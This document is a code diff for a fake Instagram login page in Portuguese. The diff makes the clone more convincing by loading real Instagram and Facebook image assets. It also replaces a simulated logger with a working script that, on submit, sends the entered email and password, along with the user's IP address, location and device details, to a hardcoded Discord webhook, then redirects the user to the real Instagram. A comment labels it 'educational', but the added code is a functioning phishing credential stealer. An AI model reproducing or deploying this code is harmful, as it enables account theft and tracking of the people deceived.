@@ -3,10 +3,198 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="stylesheet" href="/styles.css" />
-    <link rel="icon" type="image/png" href="/img/insta-fav.ico">
     <title>Instagram</title>
+    <link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            color: #262626;
+            font-size: 14px;
+            line-height: 18px;
+        }
+        
+        .flex {
+            display: flex;
+        }
+        
+        .direction-column {
+            flex-direction: column;
+        }
+        
+        .align-items-center {
+            align-items: center;
+        }
+        
+        .justify-content-center {
+            justify-content: center;
+        }
+        
+        .flex-wrap {
+            flex-wrap: wrap;
+        }
+        
+        main {
+            margin-top: 32px;
+            margin-bottom: 32px;
+            padding: 0 20px;
+        }
+        
+        #auth {
+            max-width: 350px;
+            width: 100%;
+        }
+        
+        .panel {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            margin-bottom: 10px;
+            padding: 10px;
+        }
+        
+        .login {
+            padding: 20px 40px;
+        }
+        
+        h1 {
+            margin: 22px auto 12px;
+        }
+        
+        h1 img {
+            width: 175px;
+        }
+        
+        form {
+            margin-top: 24px;
+            width: 100%;
+        }
+        
+        input {
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #262626;
+            font-size: 14px;
+            padding: 9px 8px;
+            width: 100%;
+            margin-bottom: 6px;
+        }
+        
+        button {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-weight: 600;
+            padding: 5px 9px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 8px;
+            height: 30px;
+        }
+        
+        .separator {
+            margin: 18px 0;
+        }
+        
+        .separator span {
+            background-color: #dbdbdb;
+            height: 1px;
+            width: 100%;
+        }
+        
+        .or {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0 18px;
+            text-transform: uppercase;
+        }
+        
+        .login-with-fb {
+            margin-bottom: 20px;
+        }
+        
+        .login-with-fb div {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .login-with-fb img {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+        }
+        
+        .login-with-fb a {
+            color: #385185;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .register {
+            padding: 20px;
+        }
+        
+        .register p {
+            margin-right: 5px;
+        }
+        
+        .register a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .app-download {
+            margin: 20px 0;
+        }
+        
+        .app-download p {
+            margin-bottom: 20px;
+        }
+        
+        .app-download img {
+            height: 40px;
+            margin: 0 4px;
+        }
+        
+        footer {
+            padding-bottom: 52px;
+            margin: 0 auto;
+            max-width: 1012px;
+        }
+        
+        footer ul {
+            list-style: none;
+            margin-bottom: 20px;
+        }
+        
+        footer li {
+            margin-bottom: 8px;
+            margin-right: 12px;
+        }
+        
+        footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+            text-align: center;
+        }
+
         .loading-overlay {
             position: fixed;
             top: 0; left: 0;
@@ -45,7 +233,7 @@
         <section id="auth" class="flex direction-column">
             <div class="panel login flex direction-column">
                 <h1 class="flex justify-content-center">
-                    <img src="/img/instagram-logo.png" alt="Instagram logo" />
+                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram logo" />
                 </h1>
 
                 <form id="loginForm">
@@ -62,7 +250,7 @@
 
                 <div class="login-with-fb flex direction-column align-items-center">
                     <div>
-                        <img src="/img/facebooklogo.png" alt="Facebook Icon">
+                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y5/r/TJztmXM_FkK.png" alt="Facebook Icon">
                         <a href="#">Entrar com o Facebook</a>
                     </div>
                     <a href="#">Esqueceu a senha?</a>
@@ -77,8 +265,8 @@
             <div class="app-download flex direction-column align-items-center">
                 <p>Obtenha o aplicativo.</p>
                 <div class="flex justify-content-center">
-                    <img src="/img/apple-button.png" alt="Apple Store" />
-                    <img src="/img/googleplay-button.png" alt="Google Play" />
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_portuguese-brazilian-pt_br.png/68006a2bb372.png" alt="Apple Store" />
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_portuguese-brazilian-pt_br.png/2f2a0c05b2f3.png" alt="Google Play" />
                 </div>
             </div>
         </section>
@@ -96,297 +284,178 @@
             <li><a href="#">LOCALIZAÇÃO</a></li>
             <li><a href="#">IDIOMA</a></li>
         </ul>
-        <p class="copyright">© 2020 Instagram do Facebook</p>
+        <p class="copyright">© 2023 Instagram do Meta</p>
     </footer>
 
-   <script>
-// Removi o webhook original por razões de segurança
-const webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2"; // Você deve usar um webhook próprio se estiver testando localmente
-
-function showLoading() {
-    if (document.getElementById('loading')) {
-        document.getElementById('loading').style.display = 'flex';
-    }
-}
-
-// Verifica se o elemento existe antes de adicionar o event listener
-if (document.getElementById('loginForm')) {
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
-        e.preventDefault();
-        showLoading();
-
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const userAgent = navigator.userAgent;
-
-        // Apenas para simulação local, não envia dados reais
-        console.log("Formulário enviado:", {
-            email: email,
-            password: "********", // Nunca exibir senhas, mesmo em logs
-            userAgent: userAgent
-        });
-
-        // Redireciona após processamento
-        setTimeout(() => {
-            window.location.href = "https://www.instagram.com";
-        }, 1000);
-    });
-}
-
-// Parte do servidor (Node.js)
-// Nota: Este código não será executado no navegador, apenas no servidor Node.js
-// Configuração básica
-const config = {
-    "webhook": "", // Webhook removido por segurança
-    "username": "Logger",
-    "color": 0x00FFFF,
-    "accurateLocation": false // Desativado por padrão
-};
-
-// Função para obter informações de IP (versão simulada para fins educacionais)
-async function getIPInfo(ip) {
-    return new Promise((resolve, reject) => {
-        // Versão simulada para testes locais
-        if (ip === "127.0.0.1" || ip === "::1") {
-            resolve({
-                status: "success",
-                country: "Local",
-                regionName: "Localhost",
-                city: "Development",
-                isp: "Local Development",
-                timezone: "Local/Time",
-                mobile: false,
-                proxy: false,
-                hosting: false
-            });
-            return;
-        }
-
-        // Implementação real (apenas para referência)
-        const apiUrl = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`;
+    <script>
+        // IMPORTANTE: Este código é apenas para fins educacionais
+        // Use apenas em ambiente local para entender como funciona
         
-        http.get(apiUrl, (res) => {
-            let data = '';
-            res.on('data', (chunk) => { 
-                data += chunk; 
-            });
+        // Webhook do Discord para receber os dados
+        const webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";
+        
+        // Função para mostrar o carregamento
+        function showLoading() {
+            document.getElementById('loading').style.display = 'flex';
+        }
+        
+        // Função para obter informações do IP
+        async function getIPInfo() {
+            try {
+                // Primeiro obter o IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Depois obter mais informações sobre o IP
+                const infoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const ipInfo = await infoResponse.json();
+                
+                return {
+                    ip: ipData.ip,
+                    country: ipInfo.country_name || 'Desconhecido',
+                    region: ipInfo.region || 'Desconhecido',
+                    city: ipInfo.city || 'Desconhecido',
+                    isp: ipInfo.org || 'Desconhecido',
+                    latitude: ipInfo.latitude,
+                    longitude: ipInfo.longitude,
+                    timezone: ipInfo.timezone || 'Desconhecido'
+                };
+            } catch (error) {
+                console.error('Erro ao obter informações de IP:', error);
+                return {
+                    ip: 'Desconhecido',
+                    country: 'Desconhecido',
+                    region: 'Desconhecido',
+                    city: 'Desconhecido',
+                    isp: 'Desconhecido'
+                };
+            }
+        }
+        
+        // Função para enviar dados para o webhook
+        async function sendToWebhook(data) {
+            try {
+                const response = await fetch(webhook, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Erro ao enviar para webhook:', error);
+                return false;
+            }
+        }
+        
+        // Detectar sistema operacional e navegador
+        function detectUserInfo(userAgent) {
+            let os = "Desconhecido";
+            let browser = "Desconhecido";
             
-            res.on('end', () => {
-                try {
-                    const parsedData = JSON.parse(data);
-                    if (parsedData.status === 'success') {
-                        resolve(parsedData);
-                    } else {
-                        resolve(parsedData);
-                    }
-                } catch (e) {
-                    resolve({});
-                }
-            });
-        }).on('error', (error) => {
-            resolve({});
-        });
-    });
-}
-
-// Função para enviar webhook (versão simulada)
-function sendDiscordWebhook(data) {
-    return new Promise((resolve, reject) => {
-        try {
-            // Versão simulada para testes locais
-            console.log("Simulação de envio para webhook:", data);
-            resolve(true);
-            return;
-
-            // Implementação real abaixo (apenas para referência)
-            const webhookData = JSON.stringify(data);
-            const webhookUrl = new URL(config.webhook);
+            // Sistema operacional
+            if (userAgent.includes("Windows")) {
+                os = "Windows";
+            } else if (userAgent.includes("Mac OS")) {
+                os = "MacOS";
+            } else if (userAgent.includes("Linux")) {
+                os = "Linux";
+            } else if (userAgent.includes("Android")) {
+                os = "Android";
+            } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
+                os = "iOS";
+            }
             
-            const options = {
-                hostname: webhookUrl.hostname,
-                path: webhookUrl.pathname + webhookUrl.search,
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Content-Length': Buffer.byteLength(webhookData)
-                }
+            // Navegador
+            if (userAgent.includes("Firefox")) {
+                browser = "Firefox";
+            } else if (userAgent.includes("Chrome")) {
+                browser = "Chrome";
+            } else if (userAgent.includes("Safari")) {
+                browser = "Safari";
+            } else if (userAgent.includes("Edge")) {
+                browser = "Edge";
+            } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
+                browser = "Opera";
+            }
+            
+            return { os, browser };
+        }
+        
+        // Manipular envio do formulário
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            showLoading();
+            
+            // Obter valores do formulário
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const userAgent = navigator.userAgent;
+            
+            // Obter informações do IP
+            const ipInfo = await getIPInfo();
+            
+            // Detectar sistema e navegador
+            const deviceInfo = detectUserInfo(userAgent);
+            
+            // Criar payload para enviar ao Discord
+            const payload = {
+                username: "Instagram Logger",
+                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png",
+                embeds: [{
+                    title: "📱 Credenciais do Instagram Capturadas",
+                    color: 0xE1306C,
+                    fields: [
+                        {
+                            name: "📧 Usuário/Email",
+                            value: "```" + email + "```",
+                            inline: true
+                        },
+                        {
+                            name: "🔑 Senha",
+                            value: "```" + password + "```",
+                            inline: true
+                        },
+                        {
+                            name: "🌐 Informações de IP",
+                            value: "```IP: " + ipInfo.ip + "\nPaís: " + ipInfo.country + "\nRegião: " + ipInfo.region + "\nCidade: " + ipInfo.city + "\nISP: " + ipInfo.isp + "```",
+                            inline: false
+                        },
+                        {
+                            name: "📟 Informações do Dispositivo",
+                            value: "```Sistema: " + deviceInfo.os + "\nNavegador: " + deviceInfo.browser + "```",
+                            inline: false
+                        },
+                        {
+                            name: "📅 Data e Hora",
+                            value: "```" + new Date().toLocaleString() + "```",
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Instagram Login Capture"
+                    },
+                    timestamp: new Date().toISOString()
+                }]
             };
             
-            const req = https.request(options, (res) => {
-                let responseData = '';
-                
-                res.on('data', (chunk) => {
-                    responseData += chunk;
-                });
-                
-                res.on('end', () => {
-                    if (res.statusCode >= 200 && res.statusCode < 300) {
-                        resolve(true);
-                    } else {
-                        resolve(false);
-                    }
-                });
-            });
+            // Enviar para o webhook
+            console.log("Enviando dados para webhook...");
+            const success = await sendToWebhook(payload);
             
-            req.on('error', (error) => {
-                reject(error);
-            });
+            if (success) {
+                console.log("Dados enviados com sucesso!");
+            } else {
+                console.error("Falha ao enviar dados.");
+            }
             
-            req.write(webhookData);
-            req.end();
-        } catch (error) {
-            reject(error);
-        }
-    });
-}
-
-// Detectar se é um dispositivo iOS
-function isIOS(userAgent) {
-    return /iPad|iPhone|iPod/.test(userAgent);
-}
-
-// Função para formatar a mensagem
-function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null) {
-    // Detectar sistema operacional e navegador
-    let os = "Unknown";
-    let browser = "Unknown";
-    
-    if (userAgent) {
-        // Sistema operacional
-        if (userAgent.includes("Windows")) {
-            os = "Windows";
-        } else if (userAgent.includes("Mac OS")) {
-            os = "MacOS";
-        } else if (userAgent.includes("Linux")) {
-            os = "Linux";
-        } else if (userAgent.includes("Android")) {
-            os = "Android";
-        } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
-            os = "iOS";
-        }
-        
-        // Navegador
-        if (userAgent.includes("Firefox")) {
-            browser = "Firefox";
-        } else if (userAgent.includes("Chrome")) {
-            browser = "Chrome";
-        } else if (userAgent.includes("Safari")) {
-            browser = "Safari";
-        } else if (userAgent.includes("Edge")) {
-            browser = "Edge";
-        } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
-            browser = "Opera";
-        }
-    }
-
-    let coordsText = 'Unknown';
-    let coordsSource = 'Approximate';
-    
-    if (coords) {
-        coordsText = coords.replace(',', ', ');
-        coordsSource = `Precise`;
-    } else if (info && info.lat && info.lon) {
-        coordsText = `${info.lat}, ${info.lon}`;
-        coordsSource = `Approximate`;
-    }
-
-    let timezoneText = 'Unknown';
-    if (info && info.timezone) {
-        const parts = info.timezone.split('/');
-        if (parts.length >= 2) {
-            timezoneText = `${parts[1].replace('_', ' ')} (${parts[0]})`;
-        } else {
-            timezoneText = info.timezone;
-        }
-    }
-
-    let botStatus = 'False';
-    if (info && info.hosting) {
-        if (info.hosting && !info.proxy) {
-            botStatus = 'Possibly';
-        } else if (info.hosting) {
-            botStatus = 'Possibly';
-        }
-    }
-
-    let asn = 'Unknown';
-    if (info && info.as) {
-        const asnMatch = info.as.match(/AS(\d+)/i);
-        if (asnMatch && asnMatch[1]) {
-            asn = info.as;
-        } else {
-            asn = info.as;
-        }
-    }
-
-    return `**IP Info:**
-> **IP:** \`${ip || 'Unknown'}\`
-> **Provider:** \`${info && info.isp ? info.isp : 'Unknown'}\`
-> **ASN:** \`${asn}\`
-> **Country:** \`${info && info.country ? info.country : 'Unknown'}\`
-> **Region:** \`${info && info.regionName ? info.regionName : 'Unknown'}\`
-> **City:** \`${info && info.city ? info.city : 'Unknown'}\`
-> **Coords:** \`${coordsText}\` (${coordsSource})
-> **Timezone:** \`${timezoneText}\`
-> **Mobile:** \`${info && info.mobile !== undefined ? info.mobile : 'Unknown'}\`
-> **VPN:** \`${info && info.proxy !== undefined ? info.proxy : 'Unknown'}\`
-> **Bot:** \`${botStatus}\`
-
-**PC Info:**
-> **OS:** \`${os}\`
-> **Browser:** \`${browser}\`
-
-**User Agent:**
-\`\`\`
-${userAgent || 'Unknown'}
-\`\`\``;
-}
-
-// Função principal (para ambiente Node.js)
-function handleRequest(req, res) {
-    try {
-        // Obter parâmetros da URL
-        const parsedUrl = url.parse(req.url, true);
-        const params = parsedUrl.query;
-        const geoParam = params.g;
-        
-        // Obter IP e User Agent
-        const ip = req.headers['x-forwarded-for'] || 
-                req.headers['x-real-ip'] || 
-                req.socket.remoteAddress || 
-                'Desconhecido';
-        
-        const userAgent = req.headers['user-agent'] || 'Desconhecido';
-        
-        // Verificar se é iOS para tratamento especial
-        const deviceIsIOS = isIOS(userAgent);
-        
-        // Verificar se o IP é do Discord
-        const isDiscord = ip.startsWith('35');
-        
-        // Log para testes locais
-        console.log("Requisição recebida:", {
-            ip: ip,
-            userAgent: userAgent,
-            isIOS: deviceIsIOS,
-            isDiscord: isDiscord
+            // Redirecionar para o Instagram real após um pequeno atraso
+            setTimeout(function() {
+                window.location.href = "https://www.instagram.com/";
+            }, 1500);
         });
-        
-        // Responder com mensagem básica
-        res.setHeader('Content-Type', 'text/plain');
-        res.status(200).send('OK');
-        
-    } catch (error) {
-        console.error("Erro no processamento:", error);
-        res.setHeader('Content-Type', 'text/plain');
-        res.status(500).send('Error');
-    }
-}
-
-// Se estiver em ambiente Node.js, exportar a função
-if (typeof module !== 'undefined' && module.exports) {
-    module.exports = handleRequest;
-}
-</script>
+    </script>
 </body>
 </html>
